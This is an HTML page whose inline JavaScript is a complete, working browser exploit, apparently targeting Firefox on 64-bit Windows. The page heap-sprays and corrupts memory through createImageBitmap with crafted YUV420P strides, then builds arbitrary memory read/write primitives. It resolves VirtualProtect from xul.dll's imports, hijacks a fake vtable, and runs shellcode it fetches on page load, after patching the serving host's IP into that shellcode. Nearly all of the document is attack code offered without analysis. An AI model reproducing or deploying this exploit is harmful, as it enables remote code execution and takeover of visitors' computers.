<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<html><head>
    <script src="long.min.js"></script>
    <script >

debug = 0;
Long = dcodeIO.Long;
_dv = new DataView(new ArrayBuffer(0x10));
Long.fromDouble = function(d) {
    _dv.setFloat64(0, d, true);
    return Long.fromBits(_dv.getUint32(0, true), _dv.getUint32(4, true), true);
}

Long.prototype.isAddress = function() {
    return this != 0;
    var hi = this.getHighBitsUnsigned();
    return hi == 0x7fff;
}

DataView.prototype.setUint64 = function(byteOffset, value) {
    this.setUint32(byteOffset, value.getLowBitsUnsigned(), true);
    this.setUint32(byteOffset + 4, value.getHighBitsUnsigned(), true);
}

window.Long = Long;

function gc() {
    for (var i = 0; i < 0x8; i++)
        var g = new ArrayBuffer(0x1000000);
}

function log(s) {
    return;
    alert(s);
    document.write(s);
    document.write('<br/>');
}

function fail(s) {
    // alert(s);
    document.write(s);
    location.reload();
    throw s;
}

function exploit(shellcode) {
    try{
        var text = new Text("ahaha");

        var large_buffer_sz = 0x100000;
        var large_buffer = new Uint8Array(large_buffer_sz);
        for (var i = 0; i < large_buffer.length; i++) {
            // large_buffer[i] = 0x41;
        }
        var large_view = new DataView(large_buffer.buffer);

        var buffer_x = new Uint32Array(16);
        buffer_x[0] = 0x21212121;
        var buffer_y = new Uint32Array(16);
        buffer_y[0] = 0x22222222;
        var buffer_z = new Uint32Array(16);
        buffer_z[0] = 0x23232323;

        var sz = 0x200;
        var arr_sz = sz / 8 - 2;
        var stride = 9;
        var self_idx = (stride * 61 - sz - 0x10) >>> 3;
        var small_x_idx = (stride * 77 - sz - 0x10) >>> 3;
        var small_y_idx = (stride * 93 - sz - 0x10) >>> 3;
        var small_z_idx = (stride * 109 - sz - 0x10) >>> 3;

        var arr = new Array(arr_sz);
        for (var i = 0; i < arr.length; i++) {
            arr[i] = 0x33330000 + i;
        }
        var spray_cnt = 0x2000;
        var spray_arr = new Array(spray_cnt);
        arr[self_idx] = arr[self_idx + 1] = spray_arr;
        arr[small_x_idx] = arr[small_x_idx + 1] = buffer_x;
        arr[small_y_idx] = arr[small_y_idx + 1] = buffer_y;
        arr[small_z_idx] = arr[small_z_idx + 1] = buffer_z;
        for (var i = 0; i < spray_cnt; i++) {
            spray_arr[i] = arr.slice(0);
        }

        gc();

        for (var i = spray_cnt / 4; i < spray_cnt / 4 * 3; i += 2) {
            delete spray_arr[i];
            spray_arr[i] = null;
            spray_arr[i] = i;
        }

        gc();

        for (var i = spray_cnt / 4; i < spray_cnt / 4 * 3; i += 2) {
            spray_arr[i] = new Uint32Array(sz / 4);
            spray_arr[i][0] = 0x40404040 + i;
            spray_arr[i][1] = 0xfff88000;
        }

        for (var i = spray_cnt / 4; i < spray_cnt / 4 * 3; i += 4) {
            delete spray_arr[i];
            spray_arr[i] = i;
        }

        gc();

        var y = {
            offset:0,
            width: 4,
            height: sz * 2 / stride,
            dataType: 'uint8',
            stride: stride,
            skip: 1,
        };

        // [0x201, 0x205) => 0x204 = 0x3f;
        large_buffer[stride * 57 + 2 * 0] = 0;
        large_buffer[stride * 57 + 2 * 1] = 0;
        large_buffer[stride * 57 + 2 * 2] = 0;
        large_buffer[stride * 57 + 2 * 3] = arr_sz + 2; 

        // [0x20a, 0x20e) => 0x20d = 1;
        large_buffer[stride * 58 + 2 * 0] = 0; 
        large_buffer[stride * 58 + 2 * 1] = 0; 
        large_buffer[stride * 58 + 2 * 2] = 0; 
        large_buffer[stride * 58 + 2 * 3] = 0x1; 

        var uvsize = (sz - y.stride * y.height) / 2 + 0x80000000;
        var uv = {
            offset:0,
            width: 0,
            height: 1,
            dataType: 'uint8',
            stride: uvsize,
            skip: 1,
        };

        var corrupted_arr = null;
        var corrupted_idx = null;

        // alert('go');
        for (var i = spray_cnt / 4; i < spray_cnt / 4 * 3; i += 4) {
            spray_arr[i] = createImageBitmap(large_buffer, 0, 0x1000, 'YUV420P',
                [y, uv, uv]);
            for (var j = 0; j < spray_cnt; j++) {
                if (spray_arr[j].length == 0x100) {
                    log('found corrupted array ' + j);
                    corrupted_arr = spray_arr[j];
                    corrupted_idx = j;
                    break;
                }
            }
            if (corrupted_arr != null)
                break;
        }

        if (corrupted_arr == null) {
            fail('failed to find corrupted array');
        }

        var addr_mask = Long.fromBits(0xffffffff, 0x7fff, true);
        var string_tag = Long.fromBits(0, 0xfffa8000, true);
        var object_tag = Long.fromBits(0, 0xfffe0000, true);

        var extract_address = function(idx) {
            var mask_a = Long.fromBits(0xffffffff, 0xff, true);
            var mask_b = Long.fromBits(0xffffff00, 0xffff, true);
            var a = Long.fromDouble(corrupted_arr[idx]).and(mask_a);
            var b = Long.fromDouble(corrupted_arr[idx + 1]).and(mask_b);
            return a.or(b).and(addr_mask);
        }

        var spray_arr_addr = extract_address(self_idx);
        var buffer_x_addr = extract_address(small_x_idx);
        var buffer_y_addr = extract_address(small_y_idx);
        var buffer_z_addr = extract_address(small_z_idx);

        log('spray_arr = ' + spray_arr_addr.toString(16));
        log('buffer_x = ' + buffer_x_addr.toString(16));
        log('buffer_y = ' + buffer_y_addr.toString(16));
        log('buffer_z = ' + buffer_z_addr.toString(16));

        // alert('here');

        var d = corrupted_arr[arr_sz];
        if (typeof(d) != 'number' || d < 0x40404040 || d > 0x40404040 + spray_cnt) {
            fail('no victim ab');
        }
        d -= 0x40404040;
        corrupted_arr[arr_sz] = null;
        var victim_ab = spray_arr[d];

        // use buffer_x to construct fake object
        leak_bytes = function(addr, length) { // initial leak
            var ab = new Uint32Array(length / 4);
            var dv = new DataView(ab.buffer);
            buffer_x[0] = 0x49;
            buffer_x[1] = length;
            buffer_x[2] = addr.getLowBitsUnsigned();
            buffer_x[3] = addr.getHighBitsUnsigned();
            victim_ab[0] = buffer_x_addr.add(0x40).getLowBitsUnsigned();
            victim_ab[1] = buffer_x_addr.add(0x40).or(string_tag).getHighBitsUnsigned();
            var s = corrupted_arr[arr_sz].slice();
            victim_ab[1] = 0;
            for (var i = 0; i < length; i++) {
                dv.setUint8(i, s.charCodeAt(i), true);
            }
            return ab;
        }

        var spray_arr_data = leak_bytes(spray_arr_addr, 0x20);
        var spray_arr_base = Long.fromBits(spray_arr_data[6],
            spray_arr_data[7], true);
        log('spray arr base = ' + spray_arr_base.toString(16));

        address_of = function(obj) {
            spray_arr[0] = obj;
            var tmp = leak_bytes(spray_arr_base, 8);
            return Long.fromBits(tmp[0], tmp[1], true).and(addr_mask);
        }

        var buffer_x_data = leak_bytes(buffer_x_addr, 0x40);
        var buffer_x_base = Long.fromBits(buffer_x_data[14],
            buffer_x_data[15], true);
        log('small buffer x base = ' + buffer_x_base.toString(16));
        if (!buffer_x_base.isAddress()) {
            fail('invalid small buffer y base')
        }

        var buffer_y_data = leak_bytes(buffer_y_addr, 0x40);
        var buffer_y_base = Long.fromBits(buffer_y_data[14],
            buffer_y_data[15], true);
        log('small buffer y base = ' + buffer_y_base.toString(16));
        if (!buffer_y_base.isAddress()) {
            fail('invalid small buffer y base')
        }

        var buffer_z_data = leak_bytes(buffer_z_addr, 0x40);
        var buffer_z_base = Long.fromBits(buffer_z_data[14],
            buffer_z_data[15], true);
        log('small buffer z base = ' + buffer_z_base.toString(16));
        if (!buffer_z_base.isAddress()) {
            fail('invalid small buffer z base')
        }

        for (var i = 0; i < 16; i++) {
            buffer_x[i] = buffer_x_data[i];
        }
        buffer_x[14] = buffer_y_addr.add(0x38).getLowBitsUnsigned();
        buffer_x[15] = buffer_y_addr.add(0x38).getHighBitsUnsigned();

        victim_ab[2] = buffer_x_base.getLowBitsUnsigned();
        victim_ab[3] = buffer_x_base.or(object_tag).getHighBitsUnsigned();
        corrupted_arr[arr_sz + 1][0] = buffer_z_addr.getLowBitsUnsigned();
        corrupted_arr[arr_sz + 1][1] = buffer_z_addr.getHighBitsUnsigned();
        victim_ab[3] = 0;

        Memory = function(reader, writer) {
            this._read = reader;
            this._write = writer;

            this.read = function(src) {
                // log('reading ' + src.toString(16));
                if (src % 4) {
                    var o = src % 4;
                    return (this._read(src.sub(o)) >>> (8 * o) | (this._read(src.add(4 - o)) << (8 * (4 - o))));
                } else {
                    return this._read(src);
                }
            }

            this.readByte = function(src) {
                return this.read(src) & 0xff;
            }

            this.readWord = function(src) {
                return this.read(src) & 0xffff;
            }

            this.readDword = this.read;

            this.readQword = function(src) {
                return Long.fromBits(this.read(src), this.read(src.add(4)), true);
            }

            this.readString = function(src, n) {
                var h = '';
                if (n === undefined)
                    n = 0x7fffffff;
                for (var i = 0; i < n; i++) {
                    var c = this.readByte(src.add(i));
                    if (c == 0)
                        break;
                    h += String.fromCharCode(c);
                }
                // log('read ' + src.toString(16) + ' = ' + h);
                return h;
            }

            this.write = function(dst, val) {
                // XXX assume it's already aligned!
                if (dst % 4) {
                    fail('unaligned write to ' + dst.toString(16));
                } else {
                    this._write(dst, val);
                }
            }

            this.writeDword = this.write;

            this.writeQword = function(src, val) {
                this._write(src, val.getLowBitsUnsigned());
                this._write(src.add(4), val.getHighBitsUnsigned());
            }

            this.memcpy = function(dst, src, n) {
                for (var i = 0; i < n; i += 4) {
                    var t = this.read(src.add(i));
                    this.write(dst.add(i), t);
                }
            }
        }

        var mem = new Memory(function(addr) {
            buffer_y[14] = addr.getLowBitsUnsigned();
            buffer_y[15] = addr.getHighBitsUnsigned();
            return buffer_z[0];
        }, function(addr, val) {
            buffer_y[14] = addr.getLowBitsUnsigned();
            buffer_y[15] = addr.getHighBitsUnsigned();
            buffer_z[0] = val;
        });

        /*
            corrupted_arr_addr = address_of(corrupted_arr);
            log('corrupted_arr_addr = ' + corrupted_arr_addr.toString(16));
            corrupted_arr_base = mem.readQword(corrupted_arr_addr.add(0x18));
            log('corrupted_arr_base = ' + corrupted_arr_base.toString(16));
        // mem.writeDword(corrupted_arr_addr.sub(0xc), arr_sz);
        */

        // mem.writeDword(Long.fromBits(0x41414140, 0x42424242), 0x12345678);
        var text_addr = address_of(text);
        log('text_addr = ' + text_addr.toString(16));
        var text_node = mem.readQword(text_addr.add(0x20)).mul(2); // private
        log('text_node = ' + text_node.toString(16));
        var text_vtable = mem.readQword(text_node);
        log('text_vtable = ' + text_vtable.toString(16));

        var nsTextNode_QueryInterface = mem.readQword(text_vtable);

        DynPE32x = function(pe, mem) {
            var pe = pe.and(Long.fromBits(0xffff0000, 0xffffffff)); // 0x10000 aligned
            for (var i = 0; ; i += 0x10000) {
                var base = pe.sub(i);
                if (mem.readWord(base) == 0x5a4d) {
                    // PE
                    this.base = base;
                    // log('found base = ' + base.toString(16));
                    break;
                }
            }

            this.mem = mem;

            this.parseStructures = function() {
                this.image = this.base.add(this.mem.readWord(this.base.add(0x3c)));
                if (this.mem.readDword(this.image) != 0x4550) {
                    throw "Bad NT Signature";
                }
                this.optional_header = this.image.add(0x18);
                this.export_directory = this.base.add(this.mem.readDword(this.optional_header.add(0x70)));
                this.export_directory_size = this.mem.readDword(this.optional_header.add(0x74));
                this.import_directory = this.base.add(this.mem.readDword(this.optional_header.add(0x78)));
                this.import_directory_size = this.mem.readDword(this.optional_header.add(0x7c));
            }

            this.resolveImport = function(modname, symname) {
                for (var _iid = 0; _iid < this.import_directory_size; _iid += 0x14) {
                    var iid = this.import_directory.add(_iid);
                    var Name = this.mem.readString(this.base.add(this.mem.readDword(iid.add(0xc))));
                    if (Name.toUpperCase() == modname.toUpperCase()) {
                        var OriginalFirstThunk = this.mem.readDword(iid);
                        var FirstThunk = this.mem.readDword(iid.add(0x10));
                        for (var i = 0; ; i += 8) {
                            var ForwarderString = this.mem.readDword(this.base.add(OriginalFirstThunk + i));
                            if (ForwarderString == 0)
                                break;
                            if (this.mem.readString(this.base.add(ForwarderString + 2)).toUpperCase() == symname.toUpperCase()) {
                                return this.mem.readQword(this.base.add(FirstThunk + i));
                            }
                        }
                    }
                }
            }

            this.parseStructures();
        }

        var xul = new DynPE32x(nsTextNode_QueryInterface, mem);
        var VirtualProtect = xul.resolveImport("KERNEL32.dll","VirtualProtect");
        log('VirtualProtect = ' + VirtualProtect.toString(16));

        var large_buffer_addr = address_of(large_buffer);
        log('large_buffer_addr = ' + large_buffer_addr.toString(16));
        var large_buffer_base = mem.readQword(large_buffer_addr.add(0x38));
        log('large_buffer_base = ' + large_buffer_base.toString(16));

        var fake_node_offset = 0;
        var fake_vtable_offset = 0x1000;
        var shellcode_offset = 0x2000;
        var fake_node = large_buffer_base.add(fake_node_offset);
        var fake_vtable = large_buffer_base.add(fake_vtable_offset);
        var shellcode_addr = large_buffer_base.add(shellcode_offset);

        // fill with magic methods
        for (var i = 0; i < 0x1000; i += 8) {
            var magic = 0xcccc0000 + i;
            for (var j = 0; j < 4; j++) {
                large_buffer[fake_vtable_offset + i + j] = magic >>> (8 * j);
            }
        }

        /*
         *  xul!`mozilla::MediaStream::RemoveTrackListener'::`2'::Message::Run
         *  virtual void Run()
         *  {
         *      mStream->RemoveTrackListenerImpl(mListener, mTrackID);
         *  }
         *
         *
         * sub_1816A1338 proc near
         * mov     rdx, rcx
         * mov     rcx, [rcx+8]
         * mov     r8d, [rdx+18h]
         * mov     rax, [rcx]
         * mov     rdx, [rdx+10h]
         * jmp     qword ptr [rax+0A8h]
         * sub_1816A1338 endp
         */

        // alert('fire');
        mem.memcpy(fake_node, text_node, 0x80);

        large_view.setUint64(fake_node_offset, fake_vtable);
        large_view.setUint64(fake_node_offset + 8, fake_node); // rcx := [rcx + 8]
        large_view.setUint64(fake_node_offset + 0x10, Long.fromBits(large_buffer_sz, 0)); // rdx := [rcx + 10]
        large_view.setUint32(fake_node_offset + 0x18, 0x40, true); // r8d := [rcx + 18] (PAGE_EXECUTE_READWRITE)
        large_view.setUint64(fake_vtable_offset + 0xa8, VirtualProtect);
        large_view.setUint64(fake_vtable_offset + 0x1f8, xul.base.add(0x16A1338)); // magic gadget

        if (debug) {
            large_buffer[shellcode_offset++] = 0xcc;
        }

        for (var i = 0; i < shellcode.byteLength; i++)
            large_buffer[shellcode_offset + i] = shellcode[i];

        mem.writeQword(text_addr.add(0x20), fake_node.div(2));
        text.length;
        large_view.setUint64(fake_vtable_offset + 0x1f8, shellcode_addr); // shell code
        text.length;
        delete text;

        alert('done');

    } catch (ex) {
        log(ex);
    }
}

function loader() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'shellcode', true);
    xhr.responseType = "arraybuffer";
    xhr.onload = function(e) {
        var shellcode = new Uint8Array(this.response);
        var _host = shellcode.findIndex(function(val, idx, arr) {
            return arr[idx] == 0xdd && arr[idx + 1] == 0xcc && arr[idx + 2] == 0xbb && arr[idx + 3] == 0xaa;
        });
        var _port = shellcode.findIndex(function(val, idx, arr) {
            return arr[idx] == 0x55 && arr[idx + 1] == 0x55;
        });
        if (_host && _port) {
            digits = location.host.split(':')[0].split('.').map(Number);
            for (var i = 0; i < 4; i++) {
                shellcode[_host + i] = digits[i];
            }
        } else {
            // fail('could not find host/port');
        }
        exploit(shellcode);
    }
    xhr.send(null);
}

    </script>
    </head>
    <body onload="loader()">
    </body>
    </html>
